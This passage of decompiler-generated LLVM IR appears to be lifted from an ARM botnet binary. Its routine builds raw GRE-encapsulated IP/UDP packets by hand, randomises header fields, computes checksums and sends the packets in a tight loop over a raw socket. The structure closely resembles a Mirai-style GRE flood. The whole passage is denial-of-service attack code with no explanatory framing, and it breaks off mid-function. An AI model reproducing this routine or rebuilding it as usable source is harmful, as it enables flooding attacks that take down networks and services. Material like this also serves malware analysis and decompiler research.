  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
  store i32 %v3_91e0, i32* %r4.global-to-local, align 4
  %v0_91e4 = load i32, i32* @sl, align 4
  %v2_91e4 = icmp eq i32 %v0_91e4, 0
  store i1 %v2_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91fc = urem i32 %v0_91d0, 65536
  store i32 %v3_91fc, i32* @fp, align 4
  br i1 %v2_91e4, label %dec_label_pc_9640, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91c8
  %v3_91cc = mul i32 %v0_91cc, 65536
  %v3_91c8 = mul i32 %v0_91c8, 65536
  %v0_91d0.not = or i32 %v0_91d0, -65536
  %v1_9210 = xor i32 %v0_91d0.not, 65535
  %v3_9214 = mul i32 %v6_9128, 65536
  %v1_9218 = add i32 %v3_9214, 3407872
  %tmp67 = udiv i32 %v1_9218, 256
  %v3_922c = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9210, 256
  %v3_9230 = and i32 %tmp68, 65280
  store i32 %v3_9230, i32* %ip.global-to-local, align 4
  %v1_9234 = add i32 %v3_9214, 524288
  %v1_923c = add i32 %v3_9214, 1835008
  %tmp69 = udiv i32 %v1_9210, 256
  %v4_9240 = urem i32 %tmp69, 256
  %v5_9240 = or i32 %v4_9240, %v3_9230
  %v4_9248 = udiv i32 %v1_9218, 16777216
  %v5_9248 = or i32 %v3_922c, %v4_9248
  store i32 %v5_9248, i32* @r8, align 4
  %v3_9254 = udiv i32 %v1_923c, 256
  %tmp70 = mul i32 %v0_91d0, 256
  %v3_9258 = and i32 %tmp70, 65280
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_91d0, 256
  %v4_9268 = urem i32 %tmp71, 256
  %v5_9268 = or i32 %v4_9268, %v3_9258
  %tmp72 = mul i32 %v0_91c8, 256
  %v3_926c = and i32 %tmp72, 65280
  %v1_9270 = and i32 %v3_9254, 65280
  store i32 %v1_9270, i32* @r6, align 4
  store i32 %v3_91cc, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_91cc, 256
  %v3_927c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_91c8, 256
  %v4_9280 = urem i32 %tmp74, 256
  %v5_9280 = or i32 %v4_9280, %v3_926c
  store i32 %v5_9280, i32* @lr, align 4
  %v4_9284 = udiv i32 %v1_923c, 16777216
  %v5_9284 = or i32 %v1_9270, %v4_9284
  store i32 %v5_9284, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_91cc, 256
  %v4_9288 = urem i32 %tmp75, 256
  %v5_9288 = or i32 %v4_9288, %v3_927c
  %tmp76 = udiv i32 %v1_9234, 256
  %v3_928c = and i32 %tmp76, 65280
  store i32 %v3_928c, i32* @r5, align 4
  %v4_92a0 = udiv i32 %v1_9234, 16777216
  %v5_92a0 = or i32 %v3_928c, %v4_92a0
  store i32 %v5_92a0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9268, 65536
  %v4_930c13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9284, 65536
  %v4_9370 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9240, 65536
  %v4_9374 = sdiv i32 %sext9, 65536
  %v1_937c = trunc i32 %v4_9370 to i16
  %v2_93a4 = icmp eq i32 %v1_91d4, 0
  %sext10 = mul nuw i32 %v5_9280, 65536
  %v4_93c4 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9288, 65536
  %v4_93cc = sdiv i32 %sext11, 65536
  %v1_9304 = trunc i32 %v6_90b0 to i8
  br label %dec_label_pc_92a8

dec_label_pc_92a8:                                ; preds = %bb82, %dec_label_pc_920c
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_92b4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_905c, i32* %r2.global-to-local, align 4
  %v3_92bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92bc, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @r4, align 4
  %v5_92c0 = mul i32 %v2_92c0, 4
  %v6_92c0 = add i32 %v5_92c0, %v2_905c
  %v7_92c0 = inttoptr i32 %v6_92c0 to i32*
  store i32 %v2_92b4, i32* %v7_92c0, align 4
  %v0_92c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_92c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_92c4 = mul i32 %v1_92c4, 4
  %v5_92c4 = add i32 %v4_92c4, %v0_92c4
  %v6_92c4 = inttoptr i32 %v5_92c4 to i32*
  %v7_92c4 = load i32, i32* %v6_92c4, align 4
  store i32 %v7_92c4, i32* %r4.global-to-local, align 4
  %v1_92c8 = inttoptr i32 %v7_92c4 to i8*
  %v2_92c8 = load i8, i8* %v1_92c8, align 1
  %tmp = urem i8 %v2_92c8, 16
  %v1_92cc = zext i8 %tmp to i32
  %v1_92d0 = or i32 %v1_92cc, 64
  store i32 %v1_92d0, i32* %r2.global-to-local, align 4
  %v1_92d4 = trunc i32 %v1_92d0 to i8
  store i8 %v1_92d4, i8* %v1_92c8, align 1
  %v0_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_92dc = mul i32 %v0_92d8, 24
  store i32 %v5_92dc, i32* %r1.global-to-local, align 4
  %v0_92e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92e0 = inttoptr i32 %v0_92e0 to i8*
  %v2_92e0 = load i8, i8* %v1_92e0, align 1
  %v1_92e4 = and i8 %v2_92e0, -16
  %v1_92e8 = or i8 %v1_92e4, 5
  store i32 %v1_90dc, i32* %r5.global-to-local, align 4
  store i8 %v1_92e8, i8* %v1_92e0, align 1
  store i32 %v6_9074, i32* %r2.global-to-local, align 4
  %v2_92f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92f8 = add i32 %v2_92f8, 1
  %v4_92f8 = inttoptr i32 %v3_92f8 to i8*
  store i8 %v5_9094, i8* %v4_92f8, align 1
  store i32 %v1_90b8, i32* %r3.global-to-local, align 4
  %v0_9300 = load i32, i32* %r5.global-to-local, align 4
  %v2_9300 = icmp eq i32 %v0_9300, 0
  store i1 %v2_9300, i1* %cpsr_z.global-to-local, align 1
  %v2_9304 = load i32, i32* %r4.global-to-local, align 4
  %v3_9304 = add i32 %v2_9304, 8
  %v4_9304 = inttoptr i32 %v3_9304 to i8*
  store i8 %v1_9304, i8* %v4_9304, align 1
  %v0_9308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9308, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_92a8
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_92a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  %v3_9310 = load i32, i32* %r4.global-to-local, align 4
  %v4_9310 = add i32 %v3_9310, 6
  %v5_9310 = inttoptr i32 %v4_9310 to i16*
  store i16 64, i16* %v5_9310, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9318 = load i32, i32* %r4.global-to-local, align 4
  %v3_9318 = add i32 %v2_9318, 9
  %v4_9318 = inttoptr i32 %v3_9318 to i8*
  store i8 47, i8* %v4_9318, align 1
  %v0_931c = load i32, i32* %r4.global-to-local, align 4
  %v1_931c = add i32 %v0_931c, 20
  store i32 %v1_931c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9324 = load i32, i32* %r5.global-to-local, align 4
  %v1_9324 = trunc i32 %v0_9324 to i16
  %v3_9324 = add i32 %v0_931c, 4
  %v4_9324 = inttoptr i32 %v3_9324 to i16*
  store i16 %v1_9324, i16* %v4_9324, align 2
  %v0_9328 = load i32, i32* @r8, align 4
  %v1_9328 = trunc i32 %v0_9328 to i16
  %v2_9328 = load i32, i32* %r4.global-to-local, align 4
  %v3_9328 = add i32 %v2_9328, 2
  %v4_9328 = inttoptr i32 %v3_9328 to i16*
  store i16 %v1_9328, i16* %v4_9328, align 2
  %v0_932c = load i32, i32* %r3.global-to-local, align 4
  %v1_932c = trunc i32 %v0_932c to i16
  %v2_932c = load i32, i32* %r2.global-to-local, align 4
  %v3_932c = add i32 %v2_932c, 2
  %v4_932c = inttoptr i32 %v3_932c to i16*
  store i16 %v1_932c, i16* %v4_932c, align 2
  store i32 %v6_917c, i32* %r3.global-to-local, align 4
  %v0_9334 = load i32, i32* %r4.global-to-local, align 4
  %v1_9334 = add i32 %v0_9334, 24
  %v2_9334 = inttoptr i32 %v1_9334 to i8*
  %v3_9334 = load i8, i8* %v2_9334, align 1
  %v4_9334 = zext i8 %v3_9334 to i32
  store i32 %v4_9334, i32* %r2.global-to-local, align 4
  %v2_9338 = add i32 %v0_9334, 12
  %v3_9338 = inttoptr i32 %v2_9338 to i32*
  store i32 %v6_917c, i32* %v3_9338, align 4
  %v0_933c = load i32, i32* %r2.global-to-local, align 4
  %v1_933c = and i32 %v0_933c, -241
  %v1_9340 = or i32 %v1_933c, 64
  store i32 %v1_9340, i32* %r2.global-to-local, align 4
  %v0_9344 = load i32, i32* %r1.global-to-local, align 4
  %v1_9344 = load i32, i32* @sb, align 4
  %v2_9344 = add i32 %v1_9344, %v0_9344
  store i32 %v2_9344, i32* %r1.global-to-local, align 4
  %v1_9348 = add i32 %v2_9344, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v1_9340 to i8
  %v2_934c = load i32, i32* %r4.global-to-local, align 4
  %v3_934c = add i32 %v2_934c, 24
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i32, i32* %r4.global-to-local, align 4
  %v1_9350 = add i32 %v0_9350, 24
  %v2_9350 = inttoptr i32 %v1_9350 to i8*
  %v3_9350 = load i8, i8* %v2_9350, align 1
  %v1_9354 = and i8 %v3_9350, -16
  %v1_9358 = or i8 %v1_9354, 5
  store i8 %v1_9358, i8* %v2_9350, align 1
  %v0_9360 = load i32, i32* %r1.global-to-local, align 4
  %v1_9360 = load i32, i32* %r4.global-to-local, align 4
  %v2_9360 = add i32 %v1_9360, 16
  %v3_9360 = inttoptr i32 %v2_9360 to i32*
  store i32 %v0_9360, i32* %v3_9360, align 4
  %v0_9368 = load i32, i32* %r4.global-to-local, align 4
  %v1_9368 = add i32 %v0_9368, 24
  store i32 %v1_9368, i32* @r5, align 4
  %v3_936c = add i32 %v0_9368, 25
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v5_9094, i8* %v4_936c, align 1
  store i32 %v4_9370, i32* %r2.global-to-local, align 4
  store i32 %v4_9374, i32* %r3.global-to-local, align 4
  store i32 %v1_90b8, i32* %r1.global-to-local, align 4
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 2
  %v4_937c = inttoptr i32 %v3_937c to i16*
  store i16 %v1_937c, i16* %v4_937c, align 2
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i16
  %v2_9380 = load i32, i32* @r5, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i16*
  store i16 %v1_9380, i16* %v4_9380, align 2
  %v0_9384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9384, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = trunc i32 %v0_938c to i8
  %v2_938c = load i32, i32* @r5, align 4
  %v3_938c = add i32 %v2_938c, 8
  %v4_938c = inttoptr i32 %v3_938c to i8*
  store i8 %v1_938c, i8* %v4_938c, align 1
  %v0_9390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9390, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9390 = load i32, i32* %r2.global-to-local, align 4
  %v2_9390 = trunc i32 %v1_9390 to i16
  %v3_9390 = load i32, i32* @r5, align 4
  %v4_9390 = add i32 %v3_9390, 6
  %v5_9390 = inttoptr i32 %v4_9390 to i16*
  store i16 %v2_9390, i16* %v5_9390, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9394 = load i32, i32* %r3.global-to-local, align 4
  %v1_9394 = trunc i32 %v0_9394 to i8
  %v2_9394 = load i32, i32* @r5, align 4
  %v3_9394 = add i32 %v2_9394, 9
  %v4_9394 = inttoptr i32 %v3_9394 to i8*
  store i8 %v1_9394, i8* %v4_9394, align 1
  %v0_9398 = call i32 @rand_next()
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v1_93a8 = sub i32 1023, %v0_9398
  store i32 %v1_93a8, i32* %r3.global-to-local, align 4
  br i1 %v2_93a4, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_93b0 = load i32, i32* @r5, align 4
  %v3_93b0 = add i32 %v2_93b0, 16
  %v4_93b0 = inttoptr i32 %v3_93b0 to i32*
  store i32 %v1_93a8, i32* %v4_93b0, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_93ac = load i32, i32* %r4.global-to-local, align 4
  %v2_93ac = add i32 %v1_93ac, 16
  %v3_93ac = inttoptr i32 %v2_93ac to i32*
  %v4_93ac = load i32, i32* %v3_93ac, align 4
  store i32 %v4_93ac, i32* %r3.global-to-local, align 4
  %v2_93b4 = load i32, i32* @r5, align 4
  %v3_93b4 = add i32 %v2_93b4, 16
  %v4_93b4 = inttoptr i32 %v3_93b4 to i32*
  store i32 %v4_93ac, i32* %v4_93b4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_93b8 = load i32, i32* @r5, align 4
  %v2_93b8 = add i32 %v1_93b8, 12
  %v3_93b8 = inttoptr i32 %v2_93b8 to i32*
  store i32 %v0_9398, i32* %v3_93b8, align 4
  %v3_93bc = load i32, i32* %stack_var_-44, align 4
  %v0_93c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_93c0 = add i32 %v0_93c0, 44
  store i32 %v1_93c0, i32* @r6, align 4
  store i32 %v4_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  store i32 %v1_93c8, i32* @r4, align 4
  store i32 %v4_93cc, i32* %r3.global-to-local, align 4
  %v1_93d0 = load i32, i32* @sl, align 4
  %v9_93d0 = icmp eq i32 %v1_93c8, %v1_93d0
  store i1 %v9_93d0, i1* %cpsr_z.global-to-local, align 1
  %v0_93d4 = load i32, i32* @r7, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i16
  %v3_93d4 = add i32 %v0_93c0, 48
  %v4_93d4 = inttoptr i32 %v3_93d4 to i16*
  store i16 %v1_93d4, i16* %v4_93d4, align 2
  %v0_93d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d8 = trunc i32 %v0_93d8 to i16
  %v2_93d8 = load i32, i32* @r6, align 4
  %v3_93d8 = inttoptr i32 %v2_93d8 to i16*
  store i16 %v1_93d8, i16* %v3_93d8, align 2
  %v0_93dc = load i32, i32* %r3.global-to-local, align 4
  %v1_93dc = trunc i32 %v0_93dc to i16
  %v2_93dc = load i32, i32* @r6, align 4
  %v3_93dc = add i32 %v2_93dc, 2
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 %v1_93dc, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r4, align 4
  store i32 %v0_93e0, i32* %stack_var_-44, align 4
  %v5_93e4 = icmp slt i32 %v1_93c8, %v1_93d0
  br i1 %v5_93e4, label %dec_label_pc_92a8, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %bb82
  store i32 %v6_9128, i32* %r5.global-to-local, align 4
  %v1_93f0 = add i32 %v6_9128, 8
  store i32 %v1_93f0, i32* %r4.global-to-local, align 4
  %v0_9400.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93fc.preheader

dec_label_pc_93fc.preheader:                      ; preds = %dec_label_pc_93e8, %dec_label_pc_9640
  %v0_9400.pre = phi i32 [ %v0_9400.pre.pre, %dec_label_pc_93e8 ], [ 0, %dec_label_pc_9640 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93f0, %dec_label_pc_93e8 ], [ %v1_9648, %dec_label_pc_9640 ]
  %storemerge = add i32 %v6_9128, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95f4 = icmp eq i32 %v1_91d4, 0
  %v2_9610 = icmp eq i32 %v1_9148, 0
  %v2_943c = icmp eq i32 %v6_917c, -1
  %v7_943c = icmp eq i32 %v6_917c, -1
  br label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93fc, %dec_label_pc_948c, %dec_label_pc_93fc.preheader
  %v0_9400 = phi i32 [ %v0_9400.pre, %dec_label_pc_93fc.preheader ], [ 0, %dec_label_pc_93fc ], [ %v1_9528, %dec_label_pc_948c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9400 = icmp eq i32 %v0_9400, 0
  store i1 %v2_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9400, label %dec_label_pc_93fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93fc
  br label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_948c, %dec_label_pc_940c
  %v1_9424 = phi i32 [ %v1_9524, %dec_label_pc_948c ], [ 0, %dec_label_pc_940c ]
  %v5_9414 = mul i32 %v1_9424, 24
  %v1_9418 = load i32, i32* @sb, align 4
  %v2_9418 = add i32 %v1_9418, %v5_9414
  store i32 %v2_9418, i32* %r3.global-to-local, align 4
  store i32 %v2_905c, i32* %r4.global-to-local, align 4
  %v1_9420 = add i32 %v2_9418, 20
  %v2_9420 = inttoptr i32 %v1_9420 to i8*
  %v3_9420 = load i8, i8* %v2_9420, align 1
  %v4_9420 = zext i8 %v3_9420 to i32
  store i32 %v4_9420, i32* %r2.global-to-local, align 4
  %v4_9424 = mul i32 %v1_9424, 4
  %v5_9424 = add i32 %v4_9424, %v2_905c
  %v6_9424 = inttoptr i32 %v5_9424 to i32*
  %v7_9424 = load i32, i32* %v6_9424, align 4
  store i32 %v7_9424, i32* @r5, align 4
  %v7_9428 = icmp eq i8 %v3_9420, 31
  store i1 %v7_9428, i1* %cpsr_z.global-to-local, align 1
  %v1_942c = add i32 %v7_9424, 24
  store i32 %v1_942c, i32* @r6, align 4
  %v1_9430 = add i32 %v7_9424, 44
  store i32 %v1_9430, i32* @r7, align 4
  %tmp84 = icmp ult i8 %v3_9420, 32
  br i1 %tmp84, label %dec_label_pc_9538, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_9410
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r4.global-to-local, align 4
  %v0_944c = load i32, i32* @fp, align 4
  %v9_944c = icmp eq i32 %v0_944c, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_944c, label %dec_label_pc_95b0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9598.dec_label_pc_9454_crit_edge, %dec_label_pc_9444
  %v1_9458 = phi i32 [ %v1_9458.pre, %dec_label_pc_9598.dec_label_pc_9454_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_9444 ]
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v9_9458 = icmp eq i32 %v3_91dc, %v1_9458
  store i1 %v9_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9458, label %dec_label_pc_95d8, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_95b0.dec_label_pc_9460_crit_edge, %dec_label_pc_9454
  %v1_9464 = phi i32 [ %v1_9464.pre, %dec_label_pc_95b0.dec_label_pc_9460_crit_edge ], [ %v1_9458, %dec_label_pc_9454 ]
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v9_9464 = icmp eq i32 %v3_91e0, %v1_9464
  store i1 %v9_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9464, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  store i32 %v1_91d4, i32* %r4.global-to-local, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %dec_label_pc_9608, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_946c
  %v1_9474 = load i32, i32* @r5, align 4
  %v2_9474 = add i32 %v1_9474, 16
  %v3_9474 = inttoptr i32 %v2_9474 to i32*
  %v4_9474 = load i32, i32* %v3_9474, align 4
  store i32 %v4_9474, i32* %r3.global-to-local, align 4
  %v2_9478 = load i32, i32* @r6, align 4
  %v3_9478 = add i32 %v2_9478, 16
  %v4_9478 = inttoptr i32 %v3_9478 to i32*
  store i32 %v4_9474, i32* %v4_9478, align 4
  br label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %bb83, %.thread16
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608, %dec_label_pc_961c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9490 = load i32, i32* @r5, align 4
  %v3_9490 = add i32 %v2_9490, 10
  %v4_9490 = inttoptr i32 %v3_9490 to i16*
  store i16 0, i16* %v4_9490, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9498 = load i32, i32* @r5, align 4
  store i32 %v0_9498, i32* @r0, align 4
  %v2_949c = call i32 @checksum_generic(i32 %v0_9498, i32 20)
  %v3_949c = trunc i32 %v2_949c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_94a4 = load i32, i32* @r5, align 4
  %v4_94a4 = add i32 %v3_94a4, 10
  %v5_94a4 = inttoptr i32 %v4_94a4 to i16*
  store i16 %v3_949c, i16* %v5_94a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = trunc i32 %v0_94ac to i16
  %v2_94ac = load i32, i32* @r6, align 4
  %v3_94ac = add i32 %v2_94ac, 10
  %v4_94ac = inttoptr i32 %v3_94ac to i16*
  store i16 %v1_94ac, i16* %v4_94ac, align 2
  %v0_94b0 = load i32, i32* @r6, align 4
  store i32 %v0_94b0, i32* @r0, align 4
  %v2_94b4 = call i32 @checksum_generic(i32 %v0_94b0, i32 20)
  %v3_94b4 = trunc i32 %v2_94b4 to i16
  %v3_94b8 = load i32, i32* @r6, align 4
  %v4_94b8 = add i32 %v3_94b8, 10
  %v5_94b8 = inttoptr i32 %v4_94b8 to i16*
  store i16 %v3_94b4, i16* %v5_94b8, align 2
  store i32 0, i32* @r4, align 4
  %v0_94c0 = load i32, i32* @r7, align 4
  store i32 %v0_94c0, i32* @r1, align 4
  %v1_94c4 = add i32 %v0_94c0, 4
  %v2_94c4 = inttoptr i32 %v1_94c4 to i16*
  %v3_94c4 = load i16, i16* %v2_94c4, align 2
  %v4_94c4 = zext i16 %v3_94c4 to i32
  store i32 %v4_94c4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_94cc = add i32 %v0_94c0, 6
  %v4_94cc = inttoptr i32 %v3_94cc to i16*
  store i16 0, i16* %v4_94cc, align 2
  %v0_94d0 = load i32, i32* @r6, align 4
  %v4_94d4 = call i32 @checksum_tcpudp(i32 %v0_94d0, i32 %v0_94c0, i32 %v4_94c4, i32 %stack_var_-124.0.ph)
  %v5_94d4 = trunc i32 %v4_94d4 to i16
  %v3_94d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94d8, i32* %r2.global-to-local, align 4
  %v3_94dc = mul i32 %v3_94d8, 32
  store i32 %v3_94dc, i32* %r3.global-to-local, align 4
  %v0_94e0 = load i32, i32* @r5, align 4
  %v1_94e0 = add i32 %v0_94e0, 16
  %v2_94e0 = inttoptr i32 %v1_94e0 to i32*
  %v3_94e0 = load i32, i32* %v2_94e0, align 4
  %v5_94e4 = mul i32 %v3_94d8, 24
  store i32 %v5_94e4, i32* %r3.global-to-local, align 4
  %v1_94e8 = load i32, i32* @sb, align 4
  %v2_94e8 = add i32 %v1_94e8, %v5_94e4
  store i32 %v2_94e8, i32* @lr, align 4
  %v2_94ec = add i32 %v2_94e8, 4
  %v3_94ec = inttoptr i32 %v2_94ec to i32*
  store i32 %v3_94e0, i32* %v3_94ec, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* @r7, align 4
  %v4_94f4 = add i32 %v3_94f4, 6
  %v5_94f4 = inttoptr i32 %v4_94f4 to i16*
  store i16 %v5_94d4, i16* %v5_94f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94fc = load i32, i32* %r1.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i16
  %v2_94fc = load i32, i32* %r3.global-to-local, align 4
  %v3_94fc = load i32, i32* @sb, align 4
  %v4_94fc = add i32 %v3_94fc, %v2_94fc
  %v5_94fc = inttoptr i32 %v4_94fc to i16*
  store i16 %v1_94fc, i16* %v5_94fc, align 2
  %v0_9500 = load i32, i32* @r4, align 4
  %v1_9500 = trunc i32 %v0_9500 to i16
  %v2_9500 = load i32, i32* @lr, align 4
  %v3_9500 = add i32 %v2_9500, 2
  %v4_9500 = inttoptr i32 %v3_9500 to i16*
  store i16 %v1_9500, i16* %v4_9500, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9508 = load i32, i32* @r5, align 4
  store i32 %v0_9508, i32* %r1.global-to-local, align 4
  %v0_9510 = load i32, i32* @r8, align 4
  store i32 %v0_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @lr, align 4
  %v0_9518 = load i32, i32* %ip.global-to-local, align 4
  %v6_951c = call i32 @__libc_sendto(i32 %v3_9190, i32 %v0_9508, i32 %v0_9510, i32 16384, i32 %v0_9514, i32 %v0_9518)
  %v3_9520 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9520, i32* %r3.global-to-local, align 4
  %v1_9524 = add i32 %v3_9520, 1
  %v1_9528 = load i32, i32* @sl, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9524, i32* %stack_var_-44, align 4
  %v6_9530 = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v6_9530, label %dec_label_pc_9410, label %dec_label_pc_93fc

dec_label_pc_9538:                                ; preds = %dec_label_pc_9410
  %v1_9538 = add i32 %v2_9418, 16
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = call i32 @rand_next()
  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
